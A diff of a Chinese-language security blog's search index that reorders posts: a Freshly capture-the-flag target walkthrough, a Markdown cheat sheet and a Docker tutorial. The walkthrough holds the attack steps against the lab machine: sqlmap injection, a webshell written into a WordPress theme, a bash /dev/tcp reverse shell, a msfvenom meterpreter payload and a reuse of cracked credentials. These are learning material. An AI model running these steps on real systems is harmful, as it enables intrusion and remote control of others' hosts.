@@ -173,59 +173,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Freshly靶机实战</title>
-    <url>/2019/07/31/Freshly%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yq16834j318t0u07so.jpg" alt="99"></p>
-<span id="more"></span>
-
-<h3 id="0x00-环境搭建"><a href="#0x00-环境搭建" class="headerlink" title="0x00 环境搭建"></a>0x00 环境搭建</h3><p>靶机环境：ubuntu<br>攻击机：kali、windows<br>虚拟机：VirtualBOX<br>网络环境：桥接</p>
-<h3 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h3><p>nmap扫描192.168.1.0/24</p>
-<p>探测靶机IP192.168.1.35<br>开放端口80、443、8080<br><img src="https://i.imgur.com/qP7jh5T.jpg"></p>
-<p>80端口只有一个图片，查看源代码没有任何信息<br>443和8080都跳转到wordpress网站<br><img src="https://i.imgur.com/WU4eUn5.png"></p>
-<p>上扫描器和wpscan<br>wordpress版本4.1<br>目录扫描出很多文件和目录<br><img src="https://i.imgur.com/B3aL65V.png"></p>
-<p>网站开放评论，应该是下载的插件<br><img src="https://i.imgur.com/0ZOLt7U.png"></p>
-<p>错误信息暴露绝对路径</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://192.168.1.35:8080/wordpress/wp-content/themes/twentythirteen/</span><br></pre></td></tr></tbody></table></figure>
-<p><img src="https://i.imgur.com/Hrf7C9D.png"></p>
-<p>使用dirbuster扫描192.168.1.35，发现login.php和phpmyadmin<br><img src="https://i.imgur.com/S1ee8ip.png"></p>
-<p>(PS：由于网络不一样，所以桥接的IP也变了，环境都是一样的)<br>phpmyadmin没有账号密码无法登录.<br>login.php,发现登录页面,且随意输入账户密码后页面有回显，可能存在注入<br><img src="https://i.imgur.com/z2uenoX.png"></p>
-<p>抓包后使用POST盲注测试</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sqlmap -r 1.txt --random-agent --level 3 --risk 2</span><br></pre></td></tr></tbody></table></figure>
-<p><img src="https://i.imgur.com/QWCQvyN.png"></p>
-<p>wordpress账户密码</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">admin:SuperSecretPassword</span><br></pre></td></tr></tbody></table></figure>
-<p><img src="https://i.imgur.com/Si4Wfe5.jpg"></p>
-<p>login账户密码</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">candyshop:password</span><br><span class="line">Sir:PopRocks</span><br></pre></td></tr></tbody></table></figure>
-<p>login登录页面无可利用的信息，登录成功后，页面返回1，失败返回0<br><img src="https://i.imgur.com/U4jrOeb.png"></p>
-<p>利用wordpress账户登录后台<br><img src="https://i.imgur.com/VsvPD5S.png"></p>
-<h3 id="0x02-获取webshell"><a href="#0x02-获取webshell" class="headerlink" title="0x02 获取webshell"></a>0x02 获取webshell</h3><p>编辑主题，在404模板中写入木马。<br><img src="https://i.imgur.com/Uoxihbn.png"></p>
-<p>webshell地址</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://192.168.43.95:8080/wordpress/wp-content/themes/Kratos-2/404.php</span><br></pre></td></tr></tbody></table></figure>
-<p><img src="https://i.imgur.com/OUOrmXH.png"><br>使用蚁剑连接<br><img src="https://i.imgur.com/svXlBoZ.png"></p>
-<p>使用蚁剑来执行sudo su命令失败了。。虽然id是1，权限很高，但是还是想提权试试，使用nc反弹一波</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">bash -c'sh -i＆&gt; / dev / tcp / 192.168.43.1 / 4444 0&gt;＆1'</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
-<p>在蚁剑中反弹shell失败，使用msf反弹shell</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.43.66 LPORT=4444 -f raw &gt;text.php</span><br></pre></td></tr></tbody></table></figure>
-<p>将test.php文件复制到404.php中，执行404.php，msf接收反弹成功<br><img src="https://i.imgur.com/ROZtAQC.png"><br><img src="https://i.imgur.com/NJvJEnh.jpg"></p>
-<p>获取shell，使用python命令返回一个回显终端</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></tbody></table></figure>
-<p><img src="https://i.imgur.com/GhbpU4x.jpg"></p>
-<h3 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h3><p>虽然daemon权限很高，id为1，但是不提权到root，老是感觉少了点啥，查看了敏感目录和passwd等信息，准备使用脏牛提权一波，但是安装需要root权限，通过msf反弹的shell，使用su，密码为wordpress后台登录密码。成功提权到root权限</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">daemon:SuperSecretPassword</span><br></pre></td></tr></tbody></table></figure>
-<p>密码复用。。还好测试了一波，然后这个点就放过了。。<br><img src="https://i.imgur.com/iZzF49k.jpg"></p>
-<p>通关成功！！！</p>
-<h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>1、靶场总体来说不难，用以往的知识是完全可以做出来的，主要就是看是否细心了。<br>2、信息收集，不能只看一个点，比如这个靶机开了三个web服务，其中两个指向同一个程序，但是另外一个也需要收集好信息，信息收集还是比较弱的地方。</p>
-<p>继续努力加油！！！</p>
-]]></content>
-      <categories>
-        <category>靶场实战</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Empire工具基础用法</title>
     <url>/2020/06/03/Empire%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfeflnjm2wj31900u0npe.jpg" alt="88"></p>
@@ -347,6 +294,59 @@
       </categories>
       <tags>
         <tag>后渗透工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Freshly靶机实战</title>
+    <url>/2019/07/31/Freshly%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yq16834j318t0u07so.jpg" alt="99"></p>
+<span id="more"></span>
+
+<h3 id="0x00-环境搭建"><a href="#0x00-环境搭建" class="headerlink" title="0x00 环境搭建"></a>0x00 环境搭建</h3><p>靶机环境：ubuntu<br>攻击机：kali、windows<br>虚拟机：VirtualBOX<br>网络环境：桥接</p>
+<h3 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h3><p>nmap扫描192.168.1.0/24</p>
+<p>探测靶机IP192.168.1.35<br>开放端口80、443、8080<br><img src="https://i.imgur.com/qP7jh5T.jpg"></p>
+<p>80端口只有一个图片，查看源代码没有任何信息<br>443和8080都跳转到wordpress网站<br><img src="https://i.imgur.com/WU4eUn5.png"></p>
+<p>上扫描器和wpscan<br>wordpress版本4.1<br>目录扫描出很多文件和目录<br><img src="https://i.imgur.com/B3aL65V.png"></p>
+<p>网站开放评论，应该是下载的插件<br><img src="https://i.imgur.com/0ZOLt7U.png"></p>
+<p>错误信息暴露绝对路径</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://192.168.1.35:8080/wordpress/wp-content/themes/twentythirteen/</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://i.imgur.com/Hrf7C9D.png"></p>
+<p>使用dirbuster扫描192.168.1.35，发现login.php和phpmyadmin<br><img src="https://i.imgur.com/S1ee8ip.png"></p>
+<p>(PS：由于网络不一样，所以桥接的IP也变了，环境都是一样的)<br>phpmyadmin没有账号密码无法登录.<br>login.php,发现登录页面,且随意输入账户密码后页面有回显，可能存在注入<br><img src="https://i.imgur.com/z2uenoX.png"></p>
+<p>抓包后使用POST盲注测试</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sqlmap -r 1.txt --random-agent --level 3 --risk 2</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://i.imgur.com/QWCQvyN.png"></p>
+<p>wordpress账户密码</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">admin:SuperSecretPassword</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://i.imgur.com/Si4Wfe5.jpg"></p>
+<p>login账户密码</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">candyshop:password</span><br><span class="line">Sir:PopRocks</span><br></pre></td></tr></tbody></table></figure>
+<p>login登录页面无可利用的信息，登录成功后，页面返回1，失败返回0<br><img src="https://i.imgur.com/U4jrOeb.png"></p>
+<p>利用wordpress账户登录后台<br><img src="https://i.imgur.com/VsvPD5S.png"></p>
+<h3 id="0x02-获取webshell"><a href="#0x02-获取webshell" class="headerlink" title="0x02 获取webshell"></a>0x02 获取webshell</h3><p>编辑主题，在404模板中写入木马。<br><img src="https://i.imgur.com/Uoxihbn.png"></p>
+<p>webshell地址</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://192.168.43.95:8080/wordpress/wp-content/themes/Kratos-2/404.php</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://i.imgur.com/OUOrmXH.png"><br>使用蚁剑连接<br><img src="https://i.imgur.com/svXlBoZ.png"></p>
+<p>使用蚁剑来执行sudo su命令失败了。。虽然id是1，权限很高，但是还是想提权试试，使用nc反弹一波</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">bash -c'sh -i＆&gt; / dev / tcp / 192.168.43.1 / 4444 0&gt;＆1'</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<p>在蚁剑中反弹shell失败，使用msf反弹shell</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.43.66 LPORT=4444 -f raw &gt;text.php</span><br></pre></td></tr></tbody></table></figure>
+<p>将test.php文件复制到404.php中，执行404.php，msf接收反弹成功<br><img src="https://i.imgur.com/ROZtAQC.png"><br><img src="https://i.imgur.com/NJvJEnh.jpg"></p>
+<p>获取shell，使用python命令返回一个回显终端</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://i.imgur.com/GhbpU4x.jpg"></p>
+<h3 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h3><p>虽然daemon权限很高，id为1，但是不提权到root，老是感觉少了点啥，查看了敏感目录和passwd等信息，准备使用脏牛提权一波，但是安装需要root权限，通过msf反弹的shell，使用su，密码为wordpress后台登录密码。成功提权到root权限</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">daemon:SuperSecretPassword</span><br></pre></td></tr></tbody></table></figure>
+<p>密码复用。。还好测试了一波，然后这个点就放过了。。<br><img src="https://i.imgur.com/iZzF49k.jpg"></p>
+<p>通关成功！！！</p>
+<h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>1、靶场总体来说不难，用以往的知识是完全可以做出来的，主要就是看是否细心了。<br>2、信息收集，不能只看一个点，比如这个靶机开了三个web服务，其中两个指向同一个程序，但是另外一个也需要收集好信息，信息收集还是比较弱的地方。</p>
+<p>继续努力加油！！！</p>
+]]></content>
+      <categories>
+        <category>靶场实战</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
       </tags>
   </entry>
   <entry>
@@ -900,51 +900,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Markdown语法学习</title>
-    <url>/2021/01/11/Markdown%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="../img/22.jpg" alt="30"></p>
-<span id="more"></span>
-
-<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><h1 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h1><p><strong>粗体</strong></p>
-<p><em>斜体</em></p>
-<p><em><strong>加粗斜体</strong></em></p>
-<p><del>删除线</del></p>
-<p><code>代码</code> </p>
-<h1 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h1><hr>
-<hr>
-<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><blockquote>
-<p>引用</p>
-</blockquote>
-<p><img src="" alt="截图"></p>
-<h1 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h1><p><a href="https://www.baidu.com/">点击跳转</a></p>
-<h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><ul>
-<li>无序 -</li>
-<li>有序 1.</li>
-<li></li>
-</ul>
-<h1 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h1><table>
-<thead>
-<tr>
-<th>名字</th>
-<th>姓名</th>
-<th>–</th>
-</tr>
-</thead>
-<tbody><tr>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-</tbody></table>
-<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">cmd </span><br></pre></td></tr></tbody></table></figure>
-
-
-
-
-
-]]></content>
-  </entry>
-  <entry>
     <title>MSSQL注入绕云锁分析</title>
     <url>/2019/09/05/MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E4%BA%91%E9%94%81%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0yssvv0pj31c00u0ds7.jpg" alt="99"></p>
@@ -1008,6 +963,51 @@
       <tags>
         <tag>WAF</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Markdown语法学习</title>
+    <url>/2021/01/11/Markdown%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="../img/22.jpg" alt="30"></p>
+<span id="more"></span>
+
+<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><h1 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h1><p><strong>粗体</strong></p>
+<p><em>斜体</em></p>
+<p><em><strong>加粗斜体</strong></em></p>
+<p><del>删除线</del></p>
+<p><code>代码</code> </p>
+<h1 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h1><hr>
+<hr>
+<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><blockquote>
+<p>引用</p>
+</blockquote>
+<p><img src="" alt="截图"></p>
+<h1 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h1><p><a href="https://www.baidu.com/">点击跳转</a></p>
+<h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><ul>
+<li>无序 -</li>
+<li>有序 1.</li>
+<li></li>
+</ul>
+<h1 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h1><table>
+<thead>
+<tr>
+<th>名字</th>
+<th>姓名</th>
+<th>–</th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">cmd </span><br></pre></td></tr></tbody></table></figure>
+
+
+
+
+
+]]></content>
   </entry>
   <entry>
     <title>Mysql系统表学习</title>
@@ -1431,6 +1431,96 @@
       </tags>
   </entry>
   <entry>
+    <title>docker基础学习</title>
+    <url>/2020/12/24/docker%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1g0njm1wj31c00u07fx.jpg" alt="27"></p>
+<span id="more"></span>
+
+<h3 id="0x00-docker基础命令"><a href="#0x00-docker基础命令" class="headerlink" title="0x00 docker基础命令"></a>0x00 docker基础命令</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">docker images							查看本地存在的docker镜像</span><br><span class="line"></span><br><span class="line">docker search							搜索docker镜像库</span><br><span class="line"></span><br><span class="line">docker inspect						查看镜像详细信息</span><br><span class="line"></span><br><span class="line">docker rmi image:tag			删除docker镜像</span><br><span class="line"></span><br><span class="line">docker ps 								查看运行的容器</span><br><span class="line"></span><br><span class="line">docker kill	容器ID				 杀死容器进程</span><br><span class="line"></span><br><span class="line">docker rm 容器ID 					 删除容器</span><br><span class="line"></span><br><span class="line">docker stop 容器ID				 暂停运行容器</span><br><span class="line"></span><br><span class="line">docker exec -ti 容器ID /bin/bash	进入容器</span><br><span class="line"></span><br><span class="line">docker cp 文件 容器ID:路径	宿主机复制到容器</span><br><span class="line"></span><br><span class="line">docker cp 容器ID:文件 路径	容器复制到宿主机</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="0x01-创建镜像"><a href="#0x01-创建镜像" class="headerlink" title="0x01 创建镜像"></a>0x01 创建镜像</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">命令：</span><br><span class="line"></span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;docker commit</span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line"></span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;-a , --author : 作者信息</span><br><span class="line"></span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;-m , --meassage : 提交消息</span><br><span class="line"></span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;-p , --pause=true : 提交时暂停容器运行</span><br></pre></td></tr></tbody></table></figure>
+
+<p>基于ubuntu搭建漏洞环境</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1g0tmvldj313y09ognf.jpg" alt="image-20201224235833284"></p>
+<p>运行ubuntu并进入容器</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">docker run -ti ubuntu bash</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1g0pqx4pj30fm04sdg8.jpg" alt="image-20201225000325731"></p>
+<p>复制文件到容器中</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">docker cp redis-4.0.10.tar.gz 98e5e9d2ee6c:/</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1g0n4uywj314009q75i.jpg" alt="image-20201225002719115"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1g0slszgj3140046t9p.jpg" alt="image-20201225002735723"></p>
+<p>redis未授权就是常规流程安装即可。</p>
+<p>打包成镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">docker commit -a '测试' -m 'test.txt' 98e5e9d2ee6c time/test</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1g0o8qzrj30i10bujsi.jpg" alt="image-20201225151301946"></p>
+<p>上传镜像到存储库(个人),首先使用docker本地登录</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">docker login		输入账号密码即可登录</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1g0ro2buj30k4041q33.jpg" alt="image-20201225152119976"></p>
+<p>上传镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">docker push images名</span><br></pre></td></tr></tbody></table></figure>
+
+<p>注意上传不成功，可能是因为tag名字不一致，需要和hub库的名字一致 </p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1g0nz26gj314009q75i.jpg" alt="image-20201225152731831"></p>
+<p>修改了名称后开始上传</p>
+<p>成功</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1g0q6weoj30k604w3yu.jpg" alt="image-20201225152821679"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1g0r6vddj31ik0so0we.jpg" alt="image-20201225152846139"></p>
+<h3 id="0x02-构建镜像"><a href="#0x02-构建镜像" class="headerlink" title="0x02 构建镜像"></a>0x02 构建镜像</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">docker build</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Dockerfile常用指令</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>基础镜像信息</td>
+<td>FROM</td>
+</tr>
+<tr>
+<td>维护者信息</td>
+<td>MAINTAINER</td>
+</tr>
+<tr>
+<td>镜像操作指令</td>
+<td>RUN、COPY、ADD、EXPOSE、WORKDIR、ONBUILD、USER、VOLUME等</td>
+</tr>
+<tr>
+<td>容器启动时执行命令</td>
+<td>CMD、ENTRYPOINT</td>
+</tr>
+</tbody></table>
+<p>创建Dockerfile文件,以下命令是安装基于ubuntu安装redis，并映射端口，具体使用方法可参考菜鸟教程中的docker教程</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">FROM centos		//使用centos版本作为基础镜像</span><br><span class="line">MAINTAINER Time 892732389@qq.com	//创建者信息</span><br><span class="line">RUN yum update \		//创建后执行命令，更新系统并安装常用系统组件</span><br><span class="line">	&amp;&amp; yum install -y gcc make pcre-devel zlib-devel tar zlib wget</span><br><span class="line">RUN wget http://download.redis.io/releases/redis-4.0.10.tar.gz \  //下载redis</span><br><span class="line">	&amp;&amp; tar -zxf redis-4.0.10.tar.gz \	//解压</span><br><span class="line">	&amp;&amp; cd redis-4.0.10 \		//进入文件夹</span><br><span class="line">	&amp;&amp; make \			//编译</span><br><span class="line">	&amp;&amp; make install</span><br><span class="line">EXPOSE 6937		//开启外部端口方便镜像端口映射</span><br><span class="line">CMD redis-server		//启动redis</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1g0otsscj318k0jumzs.jpg" alt="image-20201226005613525"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">docker build -t centos_redis:v1 .	//构造镜像命令</span><br></pre></td></tr></tbody></table></figure>
+
+<p>构造成功</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1g0qui7xj31120u0dlo.jpg" alt="image-20201226010531825"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">docker run -d -p 6379:6379 centos_redis:v1</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1g0s91jej31fo0u0tin.jpg" alt="image-20201226010730558"></p>
+<h3 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h3><p>菜鸟教程：<a href="https://m.runoob.com/docker/">https://m.runoob.com/docker/</a></p>
+<p><a href="https://www.cnblogs.com/jsonhc/p/7767669.html">https://www.cnblogs.com/jsonhc/p/7767669.html</a></p>
+<p><a href="https://www.cnblogs.com/momoyan/p/12437312.html">https://www.cnblogs.com/momoyan/p/12437312.html</a></p>
+]]></content>
+      <categories>
+        <category>Docker</category>
+      </categories>
+      <tags>
+        <tag>docker基础</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>docker入门学习(二)</title>
     <url>/2021/01/07/docker%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0(%E4%BA%8C)/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn0hh5xc16j31c00u0k0c.jpg" alt="30"></p>
@@ -1582,96 +1672,6 @@
       </categories>
       <tags>
         <tag>容器数据卷,Dockerfile</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>docker基础学习</title>
-    <url>/2020/12/24/docker%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1g0njm1wj31c00u07fx.jpg" alt="27"></p>
-<span id="more"></span>
-
-<h3 id="0x00-docker基础命令"><a href="#0x00-docker基础命令" class="headerlink" title="0x00 docker基础命令"></a>0x00 docker基础命令</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">docker images							查看本地存在的docker镜像</span><br><span class="line"></span><br><span class="line">docker search							搜索docker镜像库</span><br><span class="line"></span><br><span class="line">docker inspect						查看镜像详细信息</span><br><span class="line"></span><br><span class="line">docker rmi image:tag			删除docker镜像</span><br><span class="line"></span><br><span class="line">docker ps 								查看运行的容器</span><br><span class="line"></span><br><span class="line">docker kill	容器ID				 杀死容器进程</span><br><span class="line"></span><br><span class="line">docker rm 容器ID 					 删除容器</span><br><span class="line"></span><br><span class="line">docker stop 容器ID				 暂停运行容器</span><br><span class="line"></span><br><span class="line">docker exec -ti 容器ID /bin/bash	进入容器</span><br><span class="line"></span><br><span class="line">docker cp 文件 容器ID:路径	宿主机复制到容器</span><br><span class="line"></span><br><span class="line">docker cp 容器ID:文件 路径	容器复制到宿主机</span><br></pre></td></tr></tbody></table></figure>
-
-
-
-<h3 id="0x01-创建镜像"><a href="#0x01-创建镜像" class="headerlink" title="0x01 创建镜像"></a>0x01 创建镜像</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">命令：</span><br><span class="line"></span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;docker commit</span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line"></span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;-a , --author : 作者信息</span><br><span class="line"></span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;-m , --meassage : 提交消息</span><br><span class="line"></span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;-p , --pause=true : 提交时暂停容器运行</span><br></pre></td></tr></tbody></table></figure>
-
-<p>基于ubuntu搭建漏洞环境</p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1g0tmvldj313y09ognf.jpg" alt="image-20201224235833284"></p>
-<p>运行ubuntu并进入容器</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">docker run -ti ubuntu bash</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1g0pqx4pj30fm04sdg8.jpg" alt="image-20201225000325731"></p>
-<p>复制文件到容器中</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">docker cp redis-4.0.10.tar.gz 98e5e9d2ee6c:/</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1g0n4uywj314009q75i.jpg" alt="image-20201225002719115"></p>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1g0slszgj3140046t9p.jpg" alt="image-20201225002735723"></p>
-<p>redis未授权就是常规流程安装即可。</p>
-<p>打包成镜像</p>
